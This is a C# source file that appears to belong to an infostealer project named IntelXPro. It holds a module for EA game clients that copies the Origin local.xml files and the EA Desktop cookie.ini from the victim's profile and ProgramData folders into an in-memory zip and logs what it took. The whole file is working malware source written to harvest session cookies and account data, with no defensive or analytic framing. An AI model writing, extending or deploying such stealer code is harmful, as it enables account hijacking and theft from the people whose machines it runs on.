using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class EA : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "EA Origin";
            int fileCount = 0;

            string originLocalXml = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Origin", "local.xml");
            if (File.Exists(originLocalXml))
            {
                string text2 = "EA\\Origin_local.xml";
                zip.AddFile(text2, File.ReadAllBytes(originLocalXml));
                counterApplications.Files.Add(originLocalXml + " => " + text2);
                fileCount++;
            }

            string eaDesktopCookie = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Electronic Arts", "EA Desktop", "cookie.ini");
            if (File.Exists(eaDesktopCookie))
            {
                string text3 = "EA\\EA_Desktop_cookie.ini";
                zip.AddFile(text3, File.ReadAllBytes(eaDesktopCookie));
                counterApplications.Files.Add(eaDesktopCookie + " => " + text3);
                fileCount++;
            }

            string programDataOrigin = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Origin", "local.xml");
            if (File.Exists(programDataOrigin))
            {
                string text4 = "EA\\ProgramData_Origin_local.xml";
                zip.AddFile(text4, File.ReadAllBytes(programDataOrigin));
                counterApplications.Files.Add(programDataOrigin + " => " + text4);
                fileCount++;
            }

            if (fileCount > 0)
            {
                counterApplications.Files.Add("EA\\");
                counter.Games.Add(counterApplications);
            }
        }
    }
}
